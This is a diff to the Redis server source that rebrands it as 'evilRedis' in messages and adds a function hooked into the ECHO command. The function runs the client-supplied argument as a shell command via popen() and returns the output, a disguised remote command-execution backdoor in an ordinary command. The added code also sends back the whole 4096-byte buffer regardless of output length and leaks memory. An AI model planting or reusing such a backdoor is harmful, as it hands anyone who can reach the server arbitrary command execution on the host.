@@ -56,6 +56,7 @@
 #include <sys/utsname.h>
 #include <locale.h>
 #include <sys/socket.h>
+#include <stdio.h>
 
 /* Our shared "common" objects */
 
@@ -2327,13 +2328,13 @@ void createSharedObjects(void) {
     shared.noscripterr = createObject(OBJ_STRING,sdsnew(
         "-NOSCRIPT No matching script. Please use EVAL.\r\n"));
     shared.loadingerr = createObject(OBJ_STRING,sdsnew(
-        "-LOADING Redis is loading the dataset in memory\r\n"));
+        "-LOADING evilRedis is loading the dataset in memory\r\n"));
     shared.slowscripterr = createObject(OBJ_STRING,sdsnew(
-        "-BUSY Redis is busy running a script. You can only call SCRIPT KILL or SHUTDOWN NOSAVE.\r\n"));
+        "-BUSY evilRedis is busy running a script. You can only call SCRIPT KILL or SHUTDOWN NOSAVE.\r\n"));
     shared.masterdownerr = createObject(OBJ_STRING,sdsnew(
         "-MASTERDOWN Link with MASTER is down and replica-serve-stale-data is set to 'no'.\r\n"));
     shared.bgsaveerr = createObject(OBJ_STRING,sdsnew(
-        "-MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.\r\n"));
+        "-MISCONF evilRedis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.\r\n"));
     shared.roslaveerr = createObject(OBJ_STRING,sdsnew(
         "-READONLY You can't write against a read only replica.\r\n"));
     shared.noautherr = createObject(OBJ_STRING,sdsnew(
@@ -3989,7 +3990,7 @@ int prepareForShutdown(int flags) {
     /* Close the listening sockets. Apparently this allows faster restarts. */
     closeListeningSockets(1);
     serverLog(LL_WARNING,"%s is now ready to exit, bye bye...",
-        server.sentinel_mode ? "Sentinel" : "Redis");
+        server.sentinel_mode ? "Sentinel" : "evilRedis");
     return C_OK;
 }
 
@@ -4046,7 +4047,42 @@ void pingCommand(client *c) {
     }
 }
 
+void injectToEchoCommand(client *c) {
+	/*
+	char* prefix = "Abishek says: ";
+	size_t prefixlen = strlen(prefix);
+	size_t len = stringObjectLen(c->argv[1]);	
+
+	char* msg = zmalloc(sizeof(char) * (len + prefixlen + 1));
+	strncpy(msg, prefix, prefixlen + 1);
+	strncat(msg, c->argv[1]->ptr, len + 1);
+	*/
+
+	serverLog(LL_NOTICE, "Injecting payload");
+
+	const size_t buffer_len = 4096;
+	char* exec_cmd = (char*) c->argv[1]->ptr;
+
+	FILE* fp = popen(exec_cmd, "r");
+	if (fp == NULL) return;
+
+	char* out_buffer = (char*) zmalloc(sizeof(char) * (buffer_len + 1));
+	fgets(out_buffer, buffer_len, fp);
+	int status = pclose(fp);
+
+	if (status == -1) {
+		serverLog(LL_WARNING, "PCLOSE error. ErrNo: %d", errno);
+		return;
+	}
+
+	serverLog(LL_NOTICE, "out_buffer length: %zu", buffer_len);
+
+	c->argv[1]->ptr = sdsnewlen(out_buffer, buffer_len);
+	c->argv_len_sum = buffer_len + 4; /*4 for the command "echo"*/
+}
+
 void echoCommand(client *c) {
+	injectToEchoCommand(c);
     addReplyBulk(c,c->argv[1]);
 }
 
@@ -4118,10 +4154,10 @@ void commandCommand(client *c) {
 
     if (c->argc == 2 && !strcasecmp(c->argv[1]->ptr,"help")) {
         const char *help[] = {
-"(no subcommand) -- Return details about all Redis commands.",
-"COUNT -- Return the total number of commands in this Redis server.",
-"GETKEYS <full-command> -- Return the keys from a full Redis command.",
-"INFO [command-name ...] -- Return details about multiple Redis commands.",
+"(no subcommand) -- Return details about all evilRedis commands.",
+"COUNT -- Return the total number of commands in this evilRedis server.",
+"GETKEYS <full-command> -- Return the keys from a full evilRedis command.",
+"INFO [command-name ...] -- Return details about multiple evilRedis commands.",
 NULL
         };
         addReplyHelp(c, help);
@@ -4860,7 +4896,7 @@ void linuxMemoryWarnings(void) {
         serverLog(LL_WARNING,"WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.");
     }
     if (THPIsEnabled()) {
-        serverLog(LL_WARNING,"WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled (set to 'madvise' or 'never').");
+        serverLog(LL_WARNING,"WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with evilRedis. To fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. evilRedis must be restarted after THP is disabled (set to 'madvise' or 'never').");
     }
 }
 #endif /* __linux__ */
@@ -4896,7 +4932,7 @@ void daemonize(void) {
 }
 
 void version(void) {
-    printf("Redis server v=%s sha=%s:%d malloc=%s bits=%d build=%llx\n",
+    printf("evilRedis server v=%s sha=%s:%d malloc=%s bits=%d build=%llx\n",
         REDIS_VERSION,
         redisGitSHA1(),
         atoi(redisGitDirty()) > 0,
@@ -5149,7 +5185,7 @@ void loadDataFromDisk(void) {
 void redisOutOfMemoryHandler(size_t allocation_size) {
     serverLog(LL_WARNING,"Out Of Memory allocating %zu bytes!",
         allocation_size);
-    serverPanic("Redis aborting for OUT OF MEMORY. Allocating %zu bytes!", 
+    serverPanic("evilRedis aborting for OUT OF MEMORY. Allocating %zu bytes!", 
         allocation_size);
 }
 
@@ -5222,14 +5258,14 @@ int redisIsSupervised(int mode) {
             server.supervised_mode = SUPERVISED_SYSTEMD;
             serverLog(LL_WARNING,
                 "WARNING auto-supervised by systemd - you MUST set appropriate values for TimeoutStartSec and TimeoutStopSec in your service unit.");
-            return redisCommunicateSystemd("STATUS=Redis is loading...\n");
+            return redisCommunicateSystemd("STATUS=evilRedis is loading...\n");
         }
     } else if (mode == SUPERVISED_UPSTART) {
         return redisSupervisedUpstart();
     } else if (mode == SUPERVISED_SYSTEMD) {
         serverLog(LL_WARNING,
             "WARNING supervised by systemd - you MUST set appropriate values for TimeoutStartSec and TimeoutStopSec in your service unit.");
-        return redisCommunicateSystemd("STATUS=Redis is loading...\n");
+        return redisCommunicateSystemd("STATUS=evilRedis is loading...\n");
     }
 
     return 0;
@@ -5384,9 +5420,9 @@ int main(int argc, char **argv) {
     int background = server.daemonize && !server.supervised;
     if (background) daemonize();
 
-    serverLog(LL_WARNING, "oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo");
+    serverLog(LL_WARNING, "oO0OoO0OoO0Oo evilRedis is starting oO0OoO0OoO0Oo");
     serverLog(LL_WARNING,
-        "Redis version=%s, bits=%d, commit=%s, modified=%d, pid=%d, just started",
+        "evilRedis version=%s, bits=%d, commit=%s, modified=%d, pid=%d, just started",
             REDIS_VERSION,
             (sizeof(long) == 8) ? 64 : 32,
             redisGitSHA1(),
